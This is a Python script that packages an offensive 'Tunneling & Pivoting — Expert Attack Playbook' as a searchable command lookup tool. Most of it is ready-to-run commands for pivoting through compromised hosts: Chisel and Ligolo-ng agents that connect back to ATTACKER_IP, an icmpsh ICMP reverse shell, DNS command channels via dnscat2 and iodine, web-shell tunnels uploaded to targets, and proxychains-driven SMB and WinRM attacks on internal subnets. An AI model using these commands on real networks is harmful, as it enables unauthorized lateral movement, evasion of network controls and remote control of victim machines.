#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/tunneling-and-pivoting

Skill: SKILL: Tunneling & Pivoting — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-tunneling-and-pivoting.py --help
      python hack-skills-tunneling-and-pivoting.py --list
      python hack-skills-tunneling-and-pivoting.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/tunneling-and-pivoting'
TITLE = 'SKILL: Tunneling & Pivoting — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: tunneling-and-pivoting", "description: >-", "Tunneling and pivoting playbook. Use when establishing network tunnels through compromised hosts including SSH tunneling, Chisel, Ligolo-ng, socat, DNS/ICMP/HTTP tunneling, ProxyChains, and multi-layer pivoting strategies."],
    'skill-tunneling-pivoting-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for network-level attacks from pivot positions", "- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for establishing initial access shells", "- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered through pivots", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after pivoting to new hosts"],
    '1-ssh-tunneling': [],
    'local-port-forward': ["Forward a local port to a remote service through the pivot.", "```bash"],
    'access-internal-host-3306-via-localhost-3306': ["ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N"],
    'access-internal-web-app': ["ssh -L 8080:10.10.10.100:80 user@PIVOT -N"],
    'browse-http-localhost-8080': [],
    'bind-to-all-interfaces-share-with-teammates': ["ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N"],
    'remote-port-forward': ["Expose a local service to the pivot host's network.", "```bash"],
    'make-attacker-s-port-8000-accessible-on-pivot-as-pivot-9000': ["ssh -R 9000:127.0.0.1:8000 user@PIVOT -N"],
    'expose-attacker-s-listener-to-internal-network': ["ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N"],
    'internal-hosts-connect-to-pivot-4444-reaches-attacker-4444': [],
    'dynamic-port-forward-socks-proxy': ["```bash"],
    'create-socks4-5-proxy-on-localhost-1080': ["ssh -D 1080 user@PIVOT -N"],
    'use-with-proxychains': ["echo \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf", "proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24"],
    'or-with-browser-socks-proxy-browse-internal-web-apps': [],
    'jump-host-proxyjump': ["```bash"],
    'single-jump': ["ssh -J jumphost user@TARGET"],
    'multiple-jumps': ["ssh -J jump1,jump2 user@TARGET"],
    'ssh-config-for-persistent-jump': [],
    'ssh-config': ["Host internal-target", "HostName 10.10.10.100", "User admin", "ProxyJump user@jumphost.example.com"],
    '2-chisel': [],
    'reverse-socks-proxy-most-common': ["```bash"],
    'attacker-start-chisel-server': ["chisel server --reverse --port 8080"],
    'victim-connect-back-as-client-create-reverse-socks': ["chisel client ATTACKER_IP:8080 R:socks"],
    'result-socks5-proxy-on-attacker-s-127-0-0-1-1080': ["proxychains nmap -sT -Pn INTERNAL/24"],
    'port-forwarding': ["```bash"],
    'forward-specific-port': ["chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306"],
    'multiple-forwards': ["chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80"],
    'reverse-port-forward-expose-attacker-service-to-victim-network': ["chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444"],
    '3-ligolo-ng': ["TUN interface-based pivoting \u2014 transparent routing without SOCKS.", "```bash"],
    'attacker-start-proxy': ["sudo ip tuntap add user $(whoami) mode tun ligolo", "sudo ip link set ligolo up", "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"],
    'agent-victim-connect-to-proxy': ["ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert"],
    'in-ligolo-proxy-console': [],
    'add-routes-on-attacker-to-reach-internal-networks': ["sudo ip route add 10.10.10.0/24 dev ligolo", "sudo ip route add 172.16.0.0/16 dev ligolo"],
    'listener-reverse-shell-catcher-through-pivot': ["```bash"],
    'in-ligolo-proxy-console': [],
    'internal-hosts-connecting-to-agent-4444-forwarded-to-attacker-4444': [],
    'double-pivot': ["```bash"],
    'agent-1-on-dmz-tunnel-to-internal-network-1': [],
    'agent-2-on-internal-network-1-tunnel-to-internal-network-2': [],
    'add-routes-for-both-networks-on-attacker': ["sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1", "sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2"],
    '4-socat': ["```bash"],
    'tcp-port-forward': ["socat TCP-LISTEN:8080,fork TCP:INTERNAL:80"],
    'udp-relay': ["socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53"],
    'encrypted-tunnel': ["socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80"],
    'file-transfer-via-socat': [],
    'receiver': ["socat TCP-LISTEN:9999,fork file:received_file,create"],
    'sender': ["socat TCP:RECEIVER:9999 file:send_file"],
    '5-proxychains-proxifier': [],
    'proxychains-configuration': ["```ini"],
    'etc-proxychains4-conf': ["strict_chain          # fail if any proxy is down"],
    'dynamic-chain-skip-dead-proxies': [],
    'random-chain-randomize-proxy-order': ["[ProxyList]", "socks5 127.0.0.1 1080        # first hop (SSH dynamic forward)", "socks5 127.0.0.1 1081        # second hop (if chaining)", "```bash"],
    'usage': ["proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24", "proxychains crackmapexec smb 10.10.10.0/24", "proxychains evil-winrm -i 10.10.10.50 -u admin -p pass"],
    '6-windows-pivoting': [],
    'netsh-port-forwarding': ["```cmd", ":: Forward port (requires admin)", "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP", ":: List forwards", "netsh interface portproxy show all", ":: Remove", "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"],
    'plink-putty-cli': ["```cmd", ":: Dynamic SOCKS (like ssh -D)", "plink.exe -ssh -D 1080 -N user@ATTACKER", ":: Remote port forward", "plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER", ":: Automated (non-interactive, accept host key)", "echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER"],
    '7-dns-tunneling': ["```bash"],
    'iodine-ip-over-dns': [],
    'server-attacker-with-ns-record-pointing-to-attacker': ["iodined -f -c -P password 10.0.0.1 t1.yourdomain.com"],
    'client-victim': ["iodine -f -P password t1.yourdomain.com"],
    'creates-dns0-interface-route-traffic-through-it': [],
    'dnscat2-command-channel-over-dns': [],
    'server': ["ruby dnscat2.rb yourdomain.com"],
    'client': ["./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET"],
    '8-icmp-tunneling': ["```bash"],
    'icmpsh-icmp-reverse-shell-no-raw-socket-on-victim-needed-for-windows': [],
    'attacker': ["sysctl -w net.ipv4.icmp_echo_ignore_all=1", "python3 icmpsh_m.py ATTACKER_IP VICTIM_IP"],
    'victim-windows': ["icmpsh.exe -t ATTACKER_IP"],
    'ptunnel-ng-tcp-over-icmp': [],
    'server': ["ptunnel-ng -r INTERNAL_HOST -R 22"],
    'client': ["ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22", "ssh -p 2222 user@127.0.0.1"],
    '9-http-tunneling': ["```bash"],
    'neo-regeorg-socks-proxy-via-web-shell': [],
    'generate-tunnel-web-shell': ["python3 neoreg.py generate -k PASSWORD"],
    'upload-tunnel-php-aspx-jsp-to-target-web-server': [],
    'connect': ["python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php"],
    'socks-proxy-on-127-0-0-1-1080': [],
    'tunna-http-tunnel-alternative': ["python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP"],
    '10-pivoting-decision-matrix': [],
    '11-decision-tree': ["Compromised host \u2014 need to reach internal network", "\u251c\u2500\u2500 Can install tools on pivot?", "\u2502   \u251c\u2500\u2500 YES + outbound TCP allowed?", "\u2502   \u2502   \u251c\u2500\u2500 Need transparent routing? \u2192 Ligolo-ng (\u00a73)", "\u2502   \u2502   \u251c\u2500\u2500 Need SOCKS proxy? \u2192 Chisel reverse SOCKS (\u00a72)", "\u2502   \u2502   \u2514\u2500\u2500 SSH available? \u2192 SSH dynamic forward (\u00a71)", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 YES + only HTTP(S) outbound?", "\u2502   \u2502   \u251c\u2500\u2500 Chisel over HTTPS (\u00a72)", "\u2502   \u2502   \u2514\u2500\u2500 Upload web tunnel \u2192 Neo-reGeorg (\u00a79)", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 YES + only DNS outbound?", "\u2502   \u2502   \u2514\u2500\u2500 iodine or dnscat2 (\u00a77)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 YES + only ICMP allowed?", "\u2502       \u2514\u2500\u2500 ptunnel-ng or icmpsh (\u00a78)", "\u251c\u2500\u2500 Cannot install tools (web shell only)?", "\u2502   \u2514\u2500\u2500 Neo-reGeorg / Tunna via web shell (\u00a79)", "\u251c\u2500\u2500 Windows pivot?", "\u2502   \u251c\u2500\u2500 Admin access? \u2192 netsh portproxy (\u00a76)", "\u2502   \u251c\u2500\u2500 SSH client available? \u2192 ssh.exe (Windows 10+) (\u00a71)", "\u2502   \u2514\u2500\u2500 Outbound SSH? \u2192 plink (\u00a76)", "\u251c\u2500\u2500 Need multi-layer pivot?", "\u2502   \u251c\u2500\u2500 Ligolo-ng: multiple agents + route stacking (\u00a73)", "\u2502   \u251c\u2500\u2500 SSH ProxyJump chaining (\u00a71)", "\u2502   \u2514\u2500\u2500 ProxyChains with multiple SOCKS (\u00a75)", "\u2514\u2500\u2500 Teammate needs access too?", "\u251c\u2500\u2500 Bind SOCKS on 0.0.0.0 (ssh -L 0.0.0.0:...)", "\u2514\u2500\u2500 Share Ligolo-ng routes via common proxy"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()